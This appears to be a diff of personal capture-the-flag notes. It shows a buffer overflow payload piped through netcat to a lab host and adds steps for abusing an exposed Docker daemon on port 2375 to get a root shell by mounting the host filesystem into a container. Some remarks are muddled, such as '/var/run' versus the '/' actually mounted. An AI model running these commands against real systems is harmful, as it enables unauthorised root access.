@@ -494,3 +494,20 @@ then we add two times 0 so finally:
 (python -c "print('A'*40+'\x86\x06\x40\x00\x00')";cat) | nc  10.10.75.176 5700 
 
 --> sends payload to netcat server
+
+
+<br />
+<br />
+
+1. Docker Engine usually runs on 2375, therefore it is possible to curl it e.g
+
+docker -H tcp://10.10.32.46:2375 COMMAND
+
+and get info we need.
+
+
+2. We can escalate to root mounting whole /var/run to alpine and runnning that container:
+
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
+only if docker.sock has a sticky bit!!
